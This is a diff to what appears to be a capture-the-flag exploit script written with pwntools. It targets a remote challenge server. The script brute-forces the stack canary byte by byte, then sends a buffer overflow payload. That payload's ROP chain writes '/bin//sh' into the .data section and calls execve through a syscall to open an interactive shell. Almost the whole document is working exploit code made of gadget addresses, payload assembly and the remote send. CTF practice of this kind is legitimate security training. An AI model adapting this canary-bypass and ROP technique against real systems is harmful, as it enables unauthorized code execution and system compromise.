@@ -16,6 +16,11 @@ from pwn import *
 0x0000000000410893: pop rsi; ret;
 0x0000000000401f13: pop rsp; ret;
 
+0x0000000000488931: mov qword ptr [rsi], rax; ret;
+0x000000000044707b: mov qword ptr [rdi], rsi; ret;
+0x0000000000435693: mov qword ptr [rdi], rdx; ret;
+0x000000000043538b: mov qword ptr [rdi], rcx; ret;
+
 0x0000000000422113: cdq; ret;
 
 0x00000000004013ec: syscall;
@@ -24,40 +29,43 @@ ROPGadgets """
 
 
 """ Values
-0x68732f2f6e69622f:   "/bin//sh"
-0x00007fffffffe430 -> 0x68732f2f6e69622f: "/bin//sh" = rdi
-0x0000000000000000:   0                              = rsi, rdx
-0x000000000000003b:   59                             = rax
+0x68732f2f6e69622f:   "/bin//sh"   <- rdi
+0x0000000000000000:   0             = rsi, rdx
+0x000000000000003b:   59            = rax
 Values """
 
 
 # Initial payload setting
-safe_stack_buf = p64(0x68732f2f6e69622f) * 3
+safe_stack_buf = b'a' * 24
 
 canary = b""
 canary_len = 0
 byte_int_try = 0
 
-cover_rbp = p64(0x68732f2f6e69622f)
+cover_rbp = b'a' * 8
 
 rop_chain = b""
-rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
-rop_chain += p64(0x00007fffffffe430) # var
-rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
-rop_chain += p64(0x0000000000000000) # var
 rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
-rop_chain += p64(0x0000000000000000) # var
+rop_chain += p64(0x68732f2f6e69622f) # var:("/bin//sh")
+rop_chain += p64(0x00000000004006c6) # -> pop rdi; ret;
+rop_chain += p64(0x00000000006d2000) # var:(@.data)
+rop_chain += p64(0x0000000000435693) # -> mov qword ptr [rdi], rdx; ret;
+rop_chain += p64(0x0000000000410893) # -> pop rsi; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
+rop_chain += p64(0x000000000044c2a6) # -> pop rdx; ret;
+rop_chain += p64(0x0000000000000000) # var:(0)
 rop_chain += p64(0x00000000004005cf) # -> pop rax; ret;
-rop_chain += p64(0x000000000000003b) # var
+rop_chain += p64(0x000000000000003b) # var:(59)
 rop_chain += p64(0x00000000004013ec) # -> syscall;
 
 
 # Start process
 p = remote("ctf.adl.tw", 10011)
 
-# attach process to gdb
-# context.terminal = ['xterm-256color', '-e']
-# gdb.attach(p)
+
+# Stop there and attached with gdb
+# raw_input() # In python standard library, used for wating input
+
 
 # Brute-Forcing Canary
 while True:
@@ -83,16 +91,16 @@ while True:
     if canary_len == 8:
         break
 
+print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))
 
 # Start to inject ROP
 p.recvuntil(b"3. stop create child and get out")
 p.send(b'3\n')
+
+# raw_input() # In python standard library, used for wating input
+payload = safe_stack_buf + canary + cover_rbp + rop_chain
 p.recvuntil(b"Please help me find my children !!!!!\n")
-
-print(canary.decode('latin-1').encode('unicode-escape').decode('ascii'))
-
-p.send(safe_stack_buf + canary + cover_rbp + rop_chain)
-
-# gdb_command = 'x/40gx $rsi'
+# raw_input() # In python standard library, used for wating input
+p.send(payload)
 
 p.interactive()
